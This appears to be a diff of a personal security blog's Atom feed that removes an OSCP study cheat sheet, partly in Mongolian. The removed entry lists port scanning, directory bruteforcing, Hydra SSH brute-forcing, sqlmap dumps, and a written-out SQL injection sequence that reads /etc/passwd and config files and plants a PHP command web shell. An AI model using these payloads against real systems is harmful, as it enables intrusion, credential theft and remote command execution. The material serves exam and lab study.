@@ -4,121 +4,13 @@
  <title>fg0d</title>
  <link href="https://fg0d.github.io//atom.xml" rel="self"/>
  <link href="https://fg0d.github.io//"/>
- <updated>2022-07-05T12:32:59+02:00</updated>
+ <updated>2022-07-05T12:34:35+02:00</updated>
  <id>https://fg0d.github.io</id>
  <author>
    <name>fg0d</name>
    <email>fantasmdota@gmail.com</email>
  </author>
 
- 
- <entry>
-   <title>Oscp Preparation All The Things</title>
-   <link href="https://fg0d.github.io//2022/01/25/oscp-preparation-all-the-things"/>
-   <updated>2022-01-25T00:00:00+01:00</updated>
-   <id>https://fg0d.github.io/2022/01/25/OSCP-Preparation-All-The-Things</id>
-   <content type="html">&lt;h1 id=&quot;oscp-prep-by-fg0x0&quot;&gt;OSCP Prep by fg0x0&lt;/h1&gt;
-
-&lt;h3 id=&quot;open-services&quot;&gt;Open Services&lt;/h3&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ss -tlpn
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;ssh-tunnel-үүсгэх&quot;&gt;SSH Tunnel үүсгэх&lt;/h3&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 5901:127.0.0.1:5901 thomas@192.168.1.123 -p 65111
-nmap -sC -sV -A -p5901 127.0.0.1
-lsof -i:5901
-vncviewer -passwd .remote_secret localhost:5901
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;scanning&quot;&gt;Scanning&lt;/h3&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rustscan -a 192.168.1.1 --ulimit 5000
-sudo nmap -sV -T4 -p- -O -oN nmap bravery
--sV determine service/version info
--T4 for faster execution
--p- scan all ports
--O identify Operating System
--oN output to file, in our case it’s called nmap
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h3 id=&quot;web-exploitation&quot;&gt;Web Exploitation&lt;/h3&gt;
-
-&lt;h5 id=&quot;mysql&quot;&gt;MySQL&lt;/h5&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql -h 192.168.19.131 -u&amp;lt;username&amp;gt; -p -D&amp;lt;database_name&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h5 id=&quot;directory-bruteforcing&quot;&gt;Directory Bruteforcing&lt;/h5&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 dirsearch.py -u http://example.com
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h5 id=&quot;nikto&quot;&gt;Nikto&lt;/h5&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nikto -h $HOST
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h5 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h5&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos; order by 1 -- -
-&apos; order by 1 -- -
-&apos; order by 2 -- -
-&apos; order by 3 -- -
-&apos; order by 4 -- -
-&apos; order by 5 -- - 
-&apos; order by 6 -- -
-&apos; order by 7 -- -
-&apos; order by 8 -- -
-&apos; order by 9 -- -
-&apos; union select 1,2,3,4,5,6,7,8 -- - 
-( Хэрвээ 4-р хэрэглэгчээр нэвтрэх юм бол )
-&apos; union select 1,2,3,@@version,5,6,7,8 -- -
-&apos; union select 1,2,3,user(),5,6,7,8 -- -
-
-&apos; union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name=&apos;users&apos;-- -
-
-&apos; union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema,columns where table_name=&apos;users&apos;-- -
-
-&apos; union select 1,2,3,column_name,5,6,7,8 from information_schema,columns where table_name=&apos;users&apos;-- - 
-( Group-лээд гаргаж ирнэ )
-
-&apos; union select 1,2,3,group_concat(user_id,0x3a,first_name,0x3a,last_name,0x3a,email,0x3a, pass,0x3a,user_level),5,6,7,8 from users-- - 
-( table бүрийн урд хэсэгт 0x3a бичиж өгнө )
-
-File унших ( Read File )
-
-&apos; union select 1,2,3,load_file(&apos;/etc/passwd&apos;),5,6,7,8--
-&apos; union select 1,2,3,load_file(&apos;/var/www/login.php&apos;),5,6,7,8--
-&apos; union select 1,2,3,load_file(&apos;/var/www/includes/config.inc.php&apos;),5,6,7,8--
-&apos; union select 1,2,3,load_file(&apos;/var/www/includes/../mysqli_connect.php&apos;),5,6,7,8--
-
-File хуулах ( File Uploading )
-
-&apos; union select 1,2,3,&apos;Ene bol test file shuu&apos;,5,6,7,8 into outfile &apos;/var/www/test-file&apos;--
-
-PHP cmd shell хуулах
-
-&apos; union select 1,2,3,&quot;&amp;lt;?php system($_GET[&apos;cmd&apos;])?&amp;gt;&quot;,5,6,7,8 into outfile &apos;/var/www/rev-shell.php&apos;--
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h5 id=&quot;sqlmap--database-&quot;&gt;Sqlmap ( Database )&lt;/h5&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -r sql.txt --dbs
-sqlmap -r sql.txt -D Staff --dump
-sqlmap -r sql.txt -D users --dump
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h3 id=&quot;password-cracking&quot;&gt;Password Cracking&lt;/h3&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h5 id=&quot;hydra&quot;&gt;Hydra&lt;/h5&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -L users.txt -P passwords.txt ssh://192.168.56.142:22 -t 10 -I
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h5 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h5&gt;
-</content>
- </entry>
  
  <entry>
    <title>Penetration Testing All Things</title>
